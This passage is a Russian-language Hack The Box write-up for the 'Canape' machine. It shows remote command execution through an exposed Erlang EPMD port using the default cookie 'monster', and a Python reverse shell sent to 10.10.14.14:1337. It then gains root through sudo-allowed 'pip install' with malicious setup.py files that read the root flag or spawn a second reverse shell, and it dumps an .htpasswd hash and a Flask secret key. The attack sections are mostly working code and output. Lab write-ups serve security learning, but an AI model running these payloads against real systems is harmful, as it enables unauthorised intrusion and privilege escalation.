В [документации](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup "11.1. Set Up — Apache CouchDB 2.2 Documentation") же к СУБД красуется вывеска с надписью :warning: **Warning**:

[![canape-couchdb-warning.png]({{ "/img/htb/boxes/canape/canape-couchdb-warning.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-couchdb-warning.png" | relative_url }})

Что означает, что если порт `4369` "смотрит наружу интернета", то к нему можно будет подключиться любому желающему при наличии нужного cookie (cookie — единственный способ аутентификации, задействованный в этой схеме). Дефолтные куки для подключения к EPMD — "monster".

Посмотрим еще раз на запущенный процесс couchdb:
```text
www-data@canape:/$ ps auxww | grep monster
homer       642  0.7  3.5 651392 34968 ?        Sl   03:12   2:59 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```

Это и есть эти куки: `... -setcookie monster ...`.

Выполним подключение к кластеру (предварительно настроив переменную `HOME`, как того требует документация):
```text
www-data@canape:/$ HOME=/tmp erl -sname 3V1LH4CK3R -setcookie monster
Eshell V7.3  (abort with ^G)
(3V1LH4CK3R@canape)1>
```

Далее воспользуемся модулями `os:cmd` и `rpc:call` для выполнения команд от имени указанного узла БД:
```text
(3V1LH4CK3R@canape)1> os:cmd('whoami').
"www-data\n"

(3V1LH4CK3R@canape)2> nodes().
[]

(3V1LH4CK3R@canape)3> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"

(3V1LH4CK3R@canape)4> nodes().
[couchdb@localhost]

(3V1LH4CK3R@canape)5> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/bash\");s.close()'"]).
```

И последней командой получим свой реверс-шелл от пользователя homer:

```text
root@kali:~# nc -nlvvp 1337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.70.
Ncat: Connection from 10.10.10.70:52822.

homer@canape:~$ whoami
whoami
homer

homer@canape:~$ id
id
uid=1000(homer) gid=1000(homer) groups=1000(homer)
```

```text
homer@canape:~$ cat /home/homer/user.txt
cat /home/homer/user.txt
bce91869????????????????????????
```

# SSH — Порт 65535 (внутри машины)
Подключимся к машине по SSH и сразу ринемся в бой — узнаем, что скрывает `sudo`:
```text
root@kali:~# sshpass -p '0B4jyA0xtytZi7esBNGp' ssh -oStrictHostKeyChecking=no homer@10.10.10.70
homer@canape:~$ whoami
homer

homer@canape:~$ sudo -l
[sudo] password for homer:
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

`sudo` позволяет выполнять `pip install`, а это означает ни что иное, как 乇ﾑらㄚ-рут для нас. Будем собирать фальшивый `setup.py`.

## PrivEsc: homer → root
Это можно сделать просто МНОЖЕСТВОМ способов, все ограничивается лишь твоим воображением!

1\. Можно просто прочитать root-флаг:
```python
# setup.py

from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
	def run(self):
		with open('/dev/shm/PWNED', 'w') as fout:
			with open('/root/root.txt', 'r') as fin:
				fout.write(fin.read())

setup(
	cmdclass={
		'install': Exploit
	}
)
```

```text
homer@canape:/dev/shm$ ls
setup.py

homer@canape:/dev/shm$ sudo -H /usr/bin/pip install .
[sudo] password for homer: 0B4jyA0xtytZi7esBNGp
Processing /dev/shm
Installing collected packages: UNKNOWN
  Running setup.py install for UNKNOWN ... done
Successfully installed UNKNOWN
```

### root.txt
```text
homer@canape:/dev/shm$ cat PWNED
928c3df1????????????????????????
```

2\. Можно построить полноценный reverse-shell:
```python
# setup.py

from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
	def run(self):
		import socket, os, pty
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.10.14.14', 1337))
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		os.putenv('HISTFILE', '/dev/null')
		pty.spawn('/bin/bash')
		s.close()

setup(
	cmdclass={
		"install": Exploit
	}
)
```

```text
homer@canape:/dev/shm$ ls
setup.py

homer@canape:/dev/shm$ sudo -H /usr/bin/pip install .
[sudo] password for homer: 0B4jyA0xtytZi7esBNGp
Processing /dev/shm
Installing collected packages: UNKNOWN
  Running setup.py install for UNKNOWN ... -
```

```text
root@kali:~# nc -nlvvp 1337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.70.
Ncat: Connection from 10.10.10.70:52838.

root@canape:/tmp/pip-4x53u7-build# cd

root@canape:~# whoami
whoami
root

root@canape:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```text
root@canape:~# cat /root/root.txt
cat /root/root.txt
928c3df1????????????????????????
```

3\. Можно подурачиться:
```text
homer@canape:~$ sudo -H /usr/bin/pip install -r /root/root.txt
Collecting 928c3df1???????????????????????? (from -r /root/root.txt (line 1))
```

4\. И наконец, можно воспользоваться [готовым решением](https://github.com/0x00-0x00/FakePip "0x00-0x00/FakePip: Pip install exploit package"), если лень возиться самому (самый скучный вариант, имхо).

# Разное
## netstat as root
Посмотрим на сетевые подключения от суперпользователя:
```text
root@canape:~# netstat -anlpo | grep LIST
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      920/sshd         off (0.00/0/0)
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      642/beam         off (0.00/0/0)
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      642/beam         off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1055/apache2     off (0.00/0/0)
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      678/epmd         off (0.00/0/0)
tcp        0      0 0.0.0.0:39637           0.0.0.0:*               LISTEN      642/beam         off (0.00/0/0)
tcp6       0      0 :::65535                :::*                    LISTEN      920/sshd         off (0.00/0/0)
tcp6       0      0 :::4369                 :::*                    LISTEN      678/epmd         off (0.00/0/0)
unix  2      [ ACC ]     STREAM     LISTENING     10709    1/init              /run/systemd/fsck.progress
unix  2      [ ACC ]     STREAM     LISTENING     21681    1386/systemd        /run/user/1000/systemd/private
unix  2      [ ACC ]     SEQPACKET  LISTENING     10718    1/init              /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     10722    1/init              /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     26720    1659/apache2        /var/run/apache2/cgisock.1055
unix  2      [ ACC ]     STREAM     LISTENING     13355    1/init              /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     13356    1/init              /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     10705    1/init              /run/systemd/private
```

Как можно видеть, интерфейс `0.0.0.0:4369` слушает сервис `epmd`.

## www-креды
В директории `/var/www/` также можно найти интересные вещи — пароль git-пользователя (`.htpasswd`) и ключ Flask-приложения (`simpsons.wsgi`):
```text
homer@canape:~$ cd /var/www/

homer@canape:/var/www$ ls
git  html

homer@canape:/var/www$ ls -la git/
total 16
drwxr-xr-x 3 www-data www-data 4096 Jan 23  2018 .
drwxr-xr-x 4 root     root     4096 Jan 23  2018 ..
-rw-r--r-- 1 root     root       50 Jan 23  2018 .htpasswd
drwxrwsr-x 7 www-data www-data 4096 Jan 23  2018 simpsons.git
```

```text
homer@canape:/var/www$ cat git/.htpasswd
homer:Git Access:7818cef8b9dc50f4a70fd299314cb9eb
```

```text
homer@canape:/var/www$ ls -la html/
total 16
drwxr-xr-x 3 homer homer 4096 Jan 15  2018 .
drwxr-xr-x 4 root  root  4096 Jan 23  2018 ..
drwxr-xr-x 5 homer homer 4096 Apr 10 13:25 simpsons
-rw-r--r-- 1 homer homer  215 Jan 14  2018 simpsons.wsgi
```

```text
homer@canape:/var/www$ cat html/simpsons.wsgi
#!/usr/bin/python
import sys
import logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/html/")

from simpsons import app as application
application.secret_key = "sjhdajkh292hdq29dhashdkjsad"
```

Теперь можно прилечь на диванчик, спасибо за внимание :innocent:

![canape-owned.png]({{ "/img/htb/boxes/canape/canape-owned.png" | relative_url }})
